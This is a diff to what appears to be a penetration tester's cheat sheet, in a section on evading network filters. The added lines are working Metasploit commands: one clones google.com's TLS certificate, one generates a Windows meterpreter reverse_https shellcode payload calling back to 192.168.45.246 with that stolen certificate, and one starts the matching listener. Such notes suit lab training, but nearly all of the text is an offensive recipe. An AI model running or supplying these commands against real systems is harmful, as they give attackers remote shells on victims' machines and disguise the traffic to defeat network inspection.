@@ -569,8 +569,8 @@ Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process
 ```
 
 # network filters
-
 ## generate self-signed certs
+manual generation
 ```
 openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
 cat priv.key cert.crt > nasa.pem
@@ -580,13 +580,17 @@ sudo vim /etc/ssl/openssl.cnf
 CipherString=DEFAULT
 
 msf6 exploit(multi/handler) > set HandlerSSLCert /path/to/nasa.pem
+```
+automated generation, impersonate google.com certificate
+reference: https://www.darkoperator.com/blog/2015/6/14/tip-meterpreter-ssl-certificate-validation
+```
+sudo msfconsole -q -x "use auxiliary/gather/impersonate_ssl; set rhosts www.google.com; exploit"
 
-# automated, impersonate google.com certificate
-use auxiliary/gather/impersonate_ssl
-set rhosts www.google.com
-exploit
-use multi/handler
-set HandlerSSLCert /root/.msf4/loot/<stolen>.pem
+# generate payload
+sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.246 LPORT=443 EXITFUNC=thread HANDLERSSLCERT=/root/.msf4/loot/<stolen>.pem -f csharp
+
+# start listener
+sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.45.246; set LPORT 443; set HANDLERSSLCERT /root/.msf4/loot/<stolen>.pem; set stagerverifysslcert true; exploit"
 ```
 
 ## domain fronting
